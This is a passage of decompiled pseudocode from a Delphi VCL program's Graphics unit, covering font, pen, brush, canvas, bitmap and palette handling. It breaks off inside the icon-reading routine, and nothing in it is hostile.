        sub_4036EC(&v13, (unsigned __int8 *)aMsSansSerif);
        StrPCopy(lf.lfFaceName, (char *)v13);
      }
      lf.lfQuality = 0;
      lf.lfOutPrecision = 0;
      lf.lfClipPrecision = 0;
      v3 = sub_413EE8(a1) - 1;
      if ( v3 )
        lf.lfPitchAndFamily = v3 == 1;
      else
        lf.lfPitchAndFamily = 2;
      v4 = CreateFontIndirectA(&lf);
      *(_DWORD *)(v16 + 8) = v4;
    }
    __writefsdword(0, v8[0]);
    v9 = (int *)&loc_413EA8;
    sub_4137D8(dword_41E6C0);
  }
  v5 = *(_DWORD *)(v16 + 8);
  v6 = v11;
  __writefsdword(0, v10[0]);
  v11 = (LStr *)&loc_413ED0;
  System::__linkproc__ LStrArrayClr(v6, 3);
  return v5;
}
// 41E6C0: using guessed type int dword_41E6C0;

//----- (00413EE8) --------------------------------------------------------
char __usercall sub_413EE8@<al>(int a1@<eax>)
{
  return *(_BYTE *)(*(_DWORD *)(a1 + 16) + 24);
}

//----- (00413EF0) --------------------------------------------------------
int __usercall Graphics::TPen::GetHandle@<eax>(int a1@<eax>)
{
  HPEN v2; // eax
  unsigned int v4[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v5; // [esp-4h] [ebp-18h]
  LOGPEN plpen; // [esp+0h] [ebp-14h] BYREF
  int v7; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v7 = *(_DWORD *)(a1 + 16);
  if ( !*(_DWORD *)(v7 + 8) )
  {
    sub_4137CC(dword_41E6C4);
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_413F76;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    if ( !*(_DWORD *)(v7 + 8) )
    {
      plpen.lopnStyle = (unsigned __int16)word_41DA38[*(unsigned __int8 *)(v7 + 28)];
      plpen.lopnWidth.x = *(_DWORD *)(v7 + 24);
      plpen.lopnColor = sub_413B3C(*(_DWORD *)(v7 + 20));
      v2 = CreatePenIndirect(&plpen);
      *(_DWORD *)(v7 + 8) = v2;
    }
    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_413F7D;
    sub_4137D8(dword_41E6C4);
  }
  return *(_DWORD *)(v7 + 8);
}
// 41E6C4: using guessed type int dword_41E6C4;

//----- (00413F88) --------------------------------------------------------
int __usercall sub_413F88@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(*(_DWORD *)(a1 + 16) + 20);
}

//----- (00413F90) --------------------------------------------------------
int __usercall Graphics::TBrush::GetHandle@<eax>(int a1@<eax>)
{
  int v2; // eax
  char v3; // al
  HBRUSH v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-Ch] [ebp-1Ch] BYREF
  void *v7; // [esp-8h] [ebp-18h]
  int *v8; // [esp-4h] [ebp-14h]
  LOGBRUSH plbrush; // [esp+0h] [ebp-10h] BYREF
  int v10; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = *(_DWORD *)(a1 + 16);
  if ( !*(_DWORD *)(v10 + 8) )
  {
    sub_4137CC(dword_41E6C8);
    v8 = &savedregs;
    v7 = &loc_41405D;
    v6 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v6);
    if ( !*(_DWORD *)(v10 + 8) )
    {
      v2 = *(_DWORD *)(v10 + 24);
      if ( v2 )
      {
        (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, int))(*(_DWORD *)v2 + 104))(
          v6,
          v7,
          v8,
          3);
        plbrush.lbHatch = (*(int (**)(void))(**(_DWORD **)(v10 + 24) + 96))();
      }
      else
      {
        plbrush.lbHatch = 0;
        v3 = *(_BYTE *)(v10 + 28);
        if ( v3 )
        {
          if ( v3 == 1 )
          {
            plbrush.lbStyle = 1;
          }
          else
          {
            plbrush.lbStyle = 2;
            plbrush.lbHatch = (v3 & 0x7F) - 2;
          }
        }
        else
        {
          plbrush.lbStyle = 0;
        }
      }
      plbrush.lbColor = sub_413B3C(*(_DWORD *)(v10 + 20));
      v4 = CreateBrushIndirect(&plbrush);
      *(_DWORD *)(v10 + 8) = v4;
    }
    __writefsdword(0, (unsigned int)v6);
    v8 = (int *)&loc_414064;
    sub_4137D8(dword_41E6C8);
  }
  return *(_DWORD *)(v10 + 8);
}
// 41E6C8: using guessed type int dword_41E6C8;

//----- (00414070) --------------------------------------------------------
char __usercall sub_414070@<al>(int a1@<eax>)
{
  return *(_BYTE *)(*(_DWORD *)(a1 + 16) + 28);
}

//----- (00414078) --------------------------------------------------------
void __usercall Graphics::TCanvas::Lock(int a1@<eax>)
{
  EnterCriticalSection_0(&stru_41E6A8);
  ++*(_DWORD *)(a1 + 80);
  LeaveCriticalSection_0(&stru_41E6A8);
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 56));
}

//----- (004140A0) --------------------------------------------------------
BOOL __usercall Graphics::TCanvas::MoveTo@<eax>(Graphics::TCanvas *this@<ecx>, int a2@<edx>, int a3@<eax>)
{
  Graphics::TCanvas::RequiredState(this, a3, 1);
  return MoveToEx(*(HDC *)(a3 + 4), a2, (int)this, 0);
}

//----- (004140CC) --------------------------------------------------------
bool __usercall Graphics::TCanvas::TryLock@<al>(int a1@<eax>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  bool v6; // [esp+7h] [ebp-1h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  EnterCriticalSection_0(&stru_41E6A8);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_414118;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v6 = *(_DWORD *)(a1 + 80) == 0;
  if ( v6 )
    Graphics::TCanvas::Lock(a1);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_41411F;
  LeaveCriticalSection_0(&stru_41E6A8);
  return v6;
}

//----- (00414128) --------------------------------------------------------
void __usercall Graphics::TCanvas::Unlock(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 56));
  EnterCriticalSection_0(&stru_41E6A8);
  --*(_DWORD *)(a1 + 80);
  LeaveCriticalSection_0(&stru_41E6A8);
}

//----- (00414150) --------------------------------------------------------
BOOL __usercall Graphics::TCanvas::GetPenPos@<eax>(Graphics::TCanvas *this@<ecx>, int a2@<eax>, struct tagPOINT *a3@<edx>)
{
  Graphics::TCanvas::RequiredState(this, a2, 1);
  return GetCurrentPositionEx(*(HDC *)(a2 + 4), a3);
}

//----- (00414174) --------------------------------------------------------
BOOL __usercall sub_414174@<eax>(int a1@<eax>, int a2@<edx>)
{
  return Graphics::TCanvas::MoveTo(*(Graphics::TCanvas **)(a2 + 4), *(_DWORD *)a2, a1);
}

//----- (00414194) --------------------------------------------------------
char __usercall Graphics::TCanvas::DeselectHandles@<al>(int a1@<eax>)
{
  int v2; // ebx
  HDC v3; // esi

  v2 = a1;
  v3 = *(HDC *)(a1 + 4);
  if ( v3 )
  {
    LOBYTE(a1) = *(_BYTE *)(a1 + 8) & 0xF1;
    if ( *(_BYTE *)(v2 + 8) != (_BYTE)a1 )
    {
      SelectObject(v3, h);
      SelectObject(*(HDC *)(v2 + 4), dword_41E684);
      SelectObject(*(HDC *)(v2 + 4), dword_41E688);
      LOBYTE(a1) = *(_BYTE *)(v2 + 8) & 0xF1;
      *(_BYTE *)(v2 + 8) = a1;
    }
  }
  return a1;
}

//----- (004141F0) --------------------------------------------------------
int __usercall Graphics::TCanvas::SetHandle@<eax>(unsigned int a1@<edx>, int a2@<eax>)
{
  int result; // eax
  Graphics::TCanvas *v6; // ecx
  struct tagPOINT v7; // [esp+0h] [ebp-10h] BYREF

  result = *(_DWORD *)(a2 + 4);
  if ( a1 != result )
  {
    if ( result )
    {
      Graphics::TCanvas::DeselectHandles(a2);
      Graphics::TCanvas::GetPenPos(v6, a2, &v7);
      *(struct tagPOINT *)(a2 + 24) = v7;
      result = 0;
      *(_DWORD *)(a2 + 4) = 0;
      *(_BYTE *)(a2 + 8) &= 0xFEu;
    }
    if ( a1 )
    {
      *(_BYTE *)(a2 + 8) |= 1u;
      *(_DWORD *)(a2 + 4) = a1;
      result = sub_414174(a2, a2 + 24);
    }
  }
  return result;
}
// 41420F: variable 'v6' is possibly undefined

//----- (00414244) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall Graphics::TCanvas::RequiredState@<eax>(Graphics::TCanvas *this@<ecx>, int result@<eax>, char a3@<dl>)
{
  int v3; // esi
  char v4; // bl
  void *v5; // edx
  DWORD v7; // [esp-Ch] [ebp-18h]
  DWORD v8; // [esp-8h] [ebp-14h]
  const ULONG_PTR *v9; // [esp-4h] [ebp-10h]

  LOBYTE(this) = a3;
  v3 = result;
  v4 = a3 & ~*(_BYTE *)(result + 8);
  LOBYTE(result) = 0;
  if ( v4 )
  {
    if ( (v4 & 1) != 0 )
    {
      result = (*(int (**)(void))(*(_DWORD *)v3 + 20))();
      if ( !*(_DWORD *)(v3 + 4) )
      {
        LOBYTE(v5) = 1;
        Exception_CreateRes_0(dword_40B8A8, v5);
        sub_402F98((DWORD)this, v7, v8, v9);
      }
    }
    if ( (v4 & 2) != 0 )
      result = Graphics::TCanvas::CreateFont(v3);
    if ( (v4 & 4) != 0 )
      result = Graphics::TCanvas::CreatePen(v3);
    if ( (v4 & 8) != 0 )
      result = Graphics::TCanvas::CreateBrush(v3);
    *(_BYTE *)(v3 + 8) |= v4;
  }
  return result;
}
// 4142B3: positive sp value 10 has been found
// 41427C: variable 'v5' is possibly undefined
// 414281: variable 'v7' is possibly undefined
// 414281: variable 'v8' is possibly undefined
// 414281: variable 'v9' is possibly undefined
// 40B8A8: using guessed type int dword_40B8A8[5];

//----- (004142B8) --------------------------------------------------------
COLORREF __usercall Graphics::TCanvas::CreateFont@<eax>(int a1@<eax>)
{
  void *v3; // eax
  signed int v4; // eax

  v3 = (void *)Graphics::TFont::GetHandle(*(_DWORD *)(a1 + 12));
  SelectObject(*(HDC *)(a1 + 4), v3);
  v4 = sub_413B3C(*(_DWORD *)(*(_DWORD *)(a1 + 12) + 24));
  return SetTextColor(*(HDC *)(a1 + 4), v4);
}

//----- (004142E4) --------------------------------------------------------
int __usercall Graphics::TCanvas::CreatePen@<eax>(int a1@<eax>)
{
  void *v3; // eax

  v3 = (void *)Graphics::TPen::GetHandle(*(_DWORD *)(a1 + 16));
  SelectObject(*(HDC *)(a1 + 4), v3);
  return SetROP2(*(HDC *)(a1 + 4), (unsigned __int16)word_41DA48[*(unsigned __int8 *)(*(_DWORD *)(a1 + 16) + 24)]);
}

//----- (00414314) --------------------------------------------------------
int __usercall Graphics::TCanvas::CreateBrush@<eax>(int a1@<eax>)
{
  void *v3; // eax
  void *v4; // eax
  int v5; // eax
  signed int v6; // eax
  int result; // eax
  int v8; // eax
  signed int v9; // eax

  v3 = (void *)Graphics::TBrush::GetHandle(*(_DWORD *)(a1 + 20));
  UnrealizeObject(v3);
  v4 = (void *)Graphics::TBrush::GetHandle(*(_DWORD *)(a1 + 20));
  SelectObject(*(HDC *)(a1 + 4), v4);
  if ( sub_414070(*(_DWORD *)(a1 + 20)) )
  {
    v8 = sub_413F88(*(_DWORD *)(a1 + 20));
    v9 = sub_413B3C(v8);
    SetBkColor(*(HDC *)(a1 + 4), ~v9);
    result = SetBkMode(*(HDC *)(a1 + 4), 1);
  }
  else
  {
    v5 = sub_413F88(*(_DWORD *)(a1 + 20));
    v6 = sub_413B3C(v5);
    SetBkColor(*(HDC *)(a1 + 4), v6);
    result = SetBkMode(*(HDC *)(a1 + 4), 2);
  }
  return result;
}

//----- (00414390) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __fastcall sub_414390(int a1, void *a2)
{
  DWORD v2; // [esp-10h] [ebp-14h]
  DWORD v3; // [esp-Ch] [ebp-10h]
  DWORD v4; // [esp-8h] [ebp-Ch]
  const ULONG_PTR *v5; // [esp-4h] [ebp-8h]

  LOBYTE(a2) = 1;
  Exception_CreateRes_0(dword_413460, a2);
  sub_402F98(v2, v3, v4, v5);
}
// 4143A7: positive sp value 10 has been found
// 4143A1: variable 'v2' is possibly undefined
// 4143A1: variable 'v3' is possibly undefined
// 4143A1: variable 'v4' is possibly undefined
// 4143A1: variable 'v5' is possibly undefined
// 413460: using guessed type int dword_413460[7];

//----- (004143A8) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __fastcall sub_4143A8(int a1, void *a2)
{
  DWORD v2; // [esp-10h] [ebp-14h]
  DWORD v3; // [esp-Ch] [ebp-10h]
  DWORD v4; // [esp-8h] [ebp-Ch]
  const ULONG_PTR *v5; // [esp-4h] [ebp-8h]

  LOBYTE(a2) = 1;
  Exception_CreateRes_0(dword_413404, a2);
  sub_402F98(v2, v3, v4, v5);
}
// 4143BF: positive sp value 10 has been found
// 4143B9: variable 'v2' is possibly undefined
// 4143B9: variable 'v3' is possibly undefined
// 4143B9: variable 'v4' is possibly undefined
// 4143B9: variable 'v5' is possibly undefined
// 413404: using guessed type int dword_413404[4];

//----- (004143C0) --------------------------------------------------------
void __fastcall sub_4143C0(int a1, void *a2)
{
  sub_4143A8(a1, a2);
}

//----- (004143CC) --------------------------------------------------------
void __fastcall sub_4143CC(int a1, void *a2)
{
  sub_4143A8(a1, a2);
}

//----- (004143D8) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_4143D8()
{
  void *v0; // edx
  LStr *v1; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v2; // [esp-1Ch] [ebp-20h] BYREF
  DWORD v3; // [esp-18h] [ebp-1Ch]
  int *v4; // [esp-14h] [ebp-18h]
  const ULONG_PTR *v5; // [esp-10h] [ebp-14h]
  unsigned int v6; // [esp-Ch] [ebp-10h]
  LStr *v7; // [esp-4h] [ebp-8h]
  BYTE *v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4 = &savedregs;
  v3 = (DWORD)&loc_414422;
  v2 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v2);
  System::LoadResString((int)off_41DAF0[0], &v8);
  LOBYTE(v0) = 1;
  Exception_Create(dword_40B84C, v0);
  sub_402F98((DWORD)v2, v3, (DWORD)v4, v5);
  v1 = v7;
  __writefsdword(0, v6);
  v7 = (LStr *)&loc_414429;
  System::__linkproc__ LStrClr(v1);
}
// 41442B: positive sp value 10 has been found
// 414402: variable 'v0' is possibly undefined
// 40B84C: using guessed type int dword_40B84C[4];
// 41DAF0: using guessed type int **off_41DAF0[5];

//----- (0041442C) --------------------------------------------------------
void Graphics::_16596()
{
  DWORD v0; // ebx
  void *v1; // edx
  LStr *v2; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v3; // [esp-Ch] [ebp-114h] BYREF
  DWORD v4; // [esp-8h] [ebp-110h]
  int *v5; // [esp-4h] [ebp-10Ch]
  const ULONG_PTR *v6; // [esp+0h] [ebp-108h]
  BYTE *v7; // [esp+4h] [ebp-104h] BYREF
  CHAR Buffer[4]; // [esp+8h] [ebp-100h] BYREF
  LStr *v9; // [esp+Ch] [ebp-FCh]
  int savedregs; // [esp+108h] [ebp+0h] BYREF

  v7 = 0;
  v5 = &savedregs;
  v4 = (DWORD)&loc_4144C8;
  v3 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v3);
  v0 = GetLastError_0();
  if ( v0 && FormatMessageA(0x1000u, 0, v0, 0x400u, Buffer, 0x100u, 0) )
  {
    sub_4036F8(&v7, (BYTE *)Buffer, 256);
    LOBYTE(v1) = 1;
    Exception_Create(dword_40B84C, v1);
    sub_402F98((DWORD)v3, v4, (DWORD)v5, v6);
  }
  else
  {
    sub_4143D8();
  }
  v2 = v9;
  __writefsdword(0, (unsigned int)v7);
  v9 = (LStr *)&loc_4144CF;
  System::__linkproc__ LStrClr(v2);
}
// 41449E: variable 'v1' is possibly undefined
// 40B84C: using guessed type int dword_40B84C[4];

//----- (004144D4) --------------------------------------------------------
int __usercall sub_4144D4@<eax>(int a1@<eax>)
{
  if ( !a1 )
    Graphics::_16596();
  return a1;
}

//----- (004144E4) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
HGDIOBJ __usercall Graphics::_16598@<eax>(void *a1@<eax>, int *a2@<edx>, char a3@<cl>)
{
  HGDIOBJ v4; // ebx
  HGDIOBJ v5; // esi
  unsigned int v7[2]; // [esp-18h] [ebp-58h] BYREF
  int *v8; // [esp-10h] [ebp-50h]
  unsigned int v9[2]; // [esp-Ch] [ebp-4Ch] BYREF
  int *v10; // [esp-4h] [ebp-44h]
  char pv[4]; // [esp+Ch] [ebp-34h] BYREF
  int wSrc; // [esp+10h] [ebp-30h]
  int hSrc; // [esp+14h] [ebp-2Ch]
  HDC hdcDest; // [esp+24h] [ebp-1Ch]
  HDC hdcSrc; // [esp+28h] [ebp-18h]
  HDC hdc; // [esp+2Ch] [ebp-14h]
  HGDIOBJ v17; // [esp+30h] [ebp-10h]
  int nWidth; // [esp+34h] [ebp-Ch]
  int nHeight; // [esp+38h] [ebp-8h]
  HANDLE h; // [esp+3Ch] [ebp-4h]
  int savedregs; // [esp+40h] [ebp+0h] BYREF

  nWidth = *a2;
  nHeight = a2[1];
  h = a1;
  hdcSrc = CreateCompatibleDC(0);
  hdcDest = CreateCompatibleDC(0);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_414632;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  GetObjectA(h, 24, pv);
  if ( a3 )
  {
    v17 = CreateBitmap(nWidth, nHeight, 1u, 1u, 0);
  }
  else
  {
    hdc = GetDC(0);
    if ( !hdc )
      Graphics::_16596();
    v8 = &savedregs;
    v7[1] = (unsigned int)&loc_4145A1;
    v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    v17 = CreateCompatibleBitmap(hdc, nWidth, nHeight);
    if ( !v17 )
      Graphics::_16596();
    __writefsdword(0, v7[0]);
    v8 = (int *)&loc_4145A8;
    ReleaseDC(0, hdc);
  }
  if ( v17 )
  {
    v4 = SelectObject(hdcSrc, h);
    v5 = SelectObject(hdcDest, v17);
    StretchBlt(hdcDest, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, wSrc, hSrc, 0xCC0020u);
    if ( v4 )
      SelectObject(hdcSrc, v4);
    if ( v5 )
      SelectObject(hdcDest, v5);
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_414639;
  DeleteDC(hdcSrc);
  DeleteDC(hdcDest);
  return v17;
}

//----- (00414644) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall Graphics::_16599@<eax>(__int16 a1@<ax>)
{
  int result; // eax

  if ( a1 == 1 || a1 == 4 || a1 == 8 )
    result = 1 << a1;
  else
    result = 0;
  return result;
}

//----- (00414664) --------------------------------------------------------
int __usercall sub_414664@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  return (~(a3 - 1) & (a3 - 1 + a2 * a1)) / 8;
}

//----- (00414678) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
HPALETTE __usercall Graphics::_16605@<eax>(BYTE *a1@<eax>)
{
  int v1; // ebx
  struct tagPALETTEENTRY v3; // [esp+0h] [ebp-424h] BYREF
  struct tagPALETTEENTRY v4[4]; // [esp+4h] [ebp-420h] BYREF
  unsigned int v5[2]; // [esp+Ch] [ebp-418h] BYREF
  int *v6; // [esp+14h] [ebp-410h]
  LOGPALETTE plpal; // [esp+1Ch] [ebp-408h] BYREF
  struct tagPALETTEENTRY v8; // [esp+3Ch] [ebp-3E8h] BYREF
  struct tagPALETTEENTRY v9; // [esp+40h] [ebp-3E4h] BYREF
  HDC hdc; // [esp+420h] [ebp-4h]
  int savedregs; // [esp+424h] [ebp+0h] BYREF

  plpal.palVersion = 768;
  plpal.palNumEntries = 16;
  Move(a1, (BYTE *)plpal.palPalEntry, 64);
  hdc = GetDC(0);
  v6 = &savedregs;
  v5[1] = (unsigned int)System::__linkproc__ HandleFinally;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v1 = GetDeviceCaps(hdc, 104);
  if ( v1 >= 16 )
  {
    GetSystemPaletteEntries(hdc, 0, 8u, plpal.palPalEntry);
    if ( v8 == 12632256 )
    {
      GetSystemPaletteEntries(hdc, v1 - 8, 1u, &v8);
      GetSystemPaletteEntries(hdc, v1 - 7, 7u, &v4[plpal.palNumEntries]);
      GetSystemPaletteEntries(hdc, 7u, 1u, &v9);
    }
    else
    {
      GetSystemPaletteEntries(hdc, v1 - 8, 8u, &v3 + plpal.palNumEntries);
    }
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_41477C;
  ReleaseDC(0, hdc);
  return CreatePalette(&plpal);
}
// 414775: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 414678: using guessed type struct tagPALETTEENTRY var_420[4];

//----- (00414790) --------------------------------------------------------
int __userpurge Graphics::_16609@<eax>(int a1@<ecx>, int a2@<edx>, BITMAPINFOHEADER *a3@<eax>, int a4, int a5)
{
  int v6; // esi
  HBITMAP v7; // eax
  int v8; // eax
  BITMAPINFOHEADER *v9; // eax
  HBITMAP v10; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // eax
  unsigned int v13[2]; // [esp-18h] [ebp-38h] BYREF
  _DWORD **v14; // [esp-10h] [ebp-30h]
  _DWORD v15[6]; // [esp-Ch] [ebp-2Ch] BYREF
  void *pjBits; // [esp+Ch] [ebp-14h]
  HDC hdc; // [esp+10h] [ebp-10h]
  HGDIOBJ ho; // [esp+14h] [ebp-Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *v19; // [esp+18h] [ebp-8h] BYREF
  BITMAPINFOHEADER *pbmih; // [esp+1Ch] [ebp-4h]
  _DWORD *savedregs; // [esp+20h] [ebp+0h] BYREF

  v19 = (struct _EXCEPTION_REGISTRATION_RECORD *)a1;
  pbmih = a3;
  a3->biHeight = (unsigned int)a3->biHeight >> 1;
  pbmih->biSizeImage = pbmih->biHeight * sub_414664(pbmih->biWidth, pbmih->biBitCount, 32);
  v6 = Graphics::_16599(pbmih->biBitCount);
  hdc = GetDC(0);
  if ( !hdc )
    sub_4143D8();
  v15[2] = &savedregs;
  v15[1] = &loc_41493C;
  v15[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  pjBits = &pbmih[1].biSize + v6;
  v7 = CreateDIBitmap(hdc, pbmih, 4u, pjBits, (const BITMAPINFO *)pbmih, 0);
  ho = (HGDIOBJ)sub_4144D4((int)v7);
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_414862;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  *(_DWORD *)a2 = Graphics::_16598(ho, (int *)a4, 0);
  __writefsdword(0, v13[0]);
  v14 = (_DWORD **)&loc_414869;
  DeleteObject(ho);
  pjBits = (char *)pjBits + pbmih->biSizeImage;
  pbmih->biBitCount = 1;
  v8 = sub_414664(pbmih->biWidth, 1, 32);
  pbmih->biSizeImage = pbmih->biHeight * v8;
  pbmih->biClrUsed = 2;
  pbmih->biClrImportant = 2;
  v9 = pbmih + 1;
  pbmih[1].biSize = 0;
  v9->biWidth = 0xFFFFFF;
  v10 = CreateDIBitmap((HDC)pbmih, pbmih, 4u, pjBits, (const BITMAPINFO *)pbmih, 0);
  ho = (HGDIOBJ)sub_4144D4((int)v10);
  savedregs = &savedregs;
  pbmih = (BITMAPINFOHEADER *)&loc_41491C;
  v19 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v19);
  v11 = (struct _EXCEPTION_REGISTRATION_RECORD *)Graphics::_16598(ho, (int *)a4, 1);
  v19->Next = v11;
  __writefsdword(0, (unsigned int)v19);
  savedregs = &loc_414923;
  DeleteObject(ho);
  __writefsdword(0, (unsigned int)v19);
  savedregs = &loc_414943;
  return ReleaseDC(0, hdc);
}

//----- (0041494C) --------------------------------------------------------
int __usercall sub_41494C@<eax>(int result@<eax>)
{
  if ( !result )
    result = 0x7FFFFFFF;
  return result;
}

//----- (00414958) --------------------------------------------------------
bool __usercall Graphics::_16611@<al>(unsigned __int8 *a1@<eax>, unsigned __int8 *a2@<edx>, int a3)
{
  int v3; // eax
  int v4; // ecx
  int v5; // ebx
  int v6; // esi
  int v8; // [esp+Ch] [ebp-8h]

  v3 = **(_DWORD **)(a3 + 8);
  v4 = *a2 - v3;
  v5 = a2[1] - *(_DWORD *)(*(_DWORD *)(a3 + 8) + 4);
  v6 = *a1 - v3;
  v8 = a1[1] - *(_DWORD *)(*(_DWORD *)(a3 + 8) + 4);
  return (int)abs32(v4) <= (int)abs32(v6)
      && (v4 <= 0 || v6 >= v4)
      && (int)abs32(v5) <= (int)abs32(v8)
      && (v5 <= 0 || v5 <= v8);
}

//----- (004149E8) --------------------------------------------------------
int __userpurge Graphics::ReadIcon@<eax>(int a1@<eax>, HICON *a2@<edx>, int a3@<ecx>, int *a4, int *a5, int a6)
{
  __int16 v6; // bx
  unsigned __int16 v7; // bx
  int v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // ebx
  int v12; // ecx
  BITMAPINFOHEADER *v13; // ebx
  LONG v14; // ebx
  const BYTE *v15; // edi
  char *v16; // esi
  HICON v17; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v19; // [esp-Ch] [ebp-88h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v20; // [esp-8h] [ebp-84h] BYREF
  int *v21; // [esp-4h] [ebp-80h]
  _DWORD v22[3]; // [esp+0h] [ebp-7Ch]
  char pv[8]; // [esp+Ch] [ebp-70h] BYREF
  int v24; // [esp+14h] [ebp-68h]
  int v25; // [esp+18h] [ebp-64h]
  unsigned __int16 v26; // [esp+1Ch] [ebp-60h]
  char v27[8]; // [esp+24h] [ebp-58h] BYREF
  int v28; // [esp+2Ch] [ebp-50h]
  int v29; // [esp+30h] [ebp-4Ch]
  unsigned __int16 v30; // [esp+34h] [ebp-48h]
  BYTE v31; // [esp+36h] [ebp-46h]
  char *v32; // [esp+3Ch] [ebp-40h]
  LONG cb; // [esp+40h] [ebp-3Ch]
  HANDLE h; // [esp+44h] [ebp-38h] BYREF
  HANDLE ho; // [esp+48h] [ebp-34h] BYREF
  LPVOID lpvBits; // [esp+4Ch] [ebp-30h]
  char *v37; // [esp+50h] [ebp-2Ch]
  HDC hdc; // [esp+54h] [ebp-28h]
  int v39; // [esp+58h] [ebp-24h]
  int v40; // [esp+5Ch] [ebp-20h]
  int v41; // [esp+60h] [ebp-1Ch]
  int v42; // [esp+64h] [ebp-18h]
  int v43; // [esp+68h] [ebp-14h]
  char *v44; // [esp+6Ch] [ebp-10h]
  int v45; // [esp+70h] [ebp-Ch]
  HICON *v46; // [esp+74h] [ebp-8h]
  int v47; // [esp+78h] [ebp-4h]
  int savedregs; // [esp+7Ch] [ebp+0h] BYREF

  v45 = a3;
  v46 = a2;
  v47 = a1;
  v43 = 16 * a3;
  v44 = sub_406D34(16 * a3);
  v21 = &savedregs;
  v20 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_414CDF;
  v19 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v19);
  (*(void (__fastcall **)(int, char *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(*(_DWORD *)v47 + 4))(
    v43,
    v44,
    v19,
    &loc_414CDF,
    &savedregs);
  if ( *(_QWORD *)a5 )
  {
    *a4 = *a5;
    a4[1] = a5[1];
  }
  else
  {
    *a4 = GetSystemMetrics(11);
    a4[1] = GetSystemMetrics(12);
  }
  hdc = GetDC(0);
  if ( !hdc )
    sub_4143D8();
  v21 = &savedregs;
  v20 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_414AD1;
  v19 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v19);
  v6 = GetDeviceCaps(hdc, 14);
  v7 = GetDeviceCaps(hdc, 12) * v6;
  if ( v7 <= 8u )
    v41 = 1 << v7;
  else
    v41 = 0x7FFFFFFF;
  __writefsdword(0, (unsigned int)v19);
  v21 = (int *)&loc_414AD8;
  ReleaseDC(0, hdc);
  v39 = 0;
  v40 = sub_41494C(*((unsigned __int16 *)v44 + 1));
  v8 = v45 - 1;
  if ( v45 - 1 > 0 )
  {
    v9 = 1;
    do
    {
      v10 = sub_41494C(*(unsigned __int16 *)&v44[16 * v9 + 2]);
      v11 = v10;
      if ( v10 <= v41
        && v10 >= v40
        && Graphics::_16611((unsigned __int8 *)&v44[16 * v39], (unsigned __int8 *)&v44[16 * v9], (int)&savedregs) )
      {
        v39 = v9;
        v40 = v11;
      }
      ++v9;
      --v8;
    }
    while ( v8 );
  }
  v32 = &v44[16 * v39];
  *a4 = (unsigned __int8)*v32;
  a4[1] = (unsigned __int8)v32[1];
  v37 = sub_406D34(*((_DWORD *)v32 + 2));
  v21 = &savedregs;
  v20 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_414CBF;
  v19 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v19);
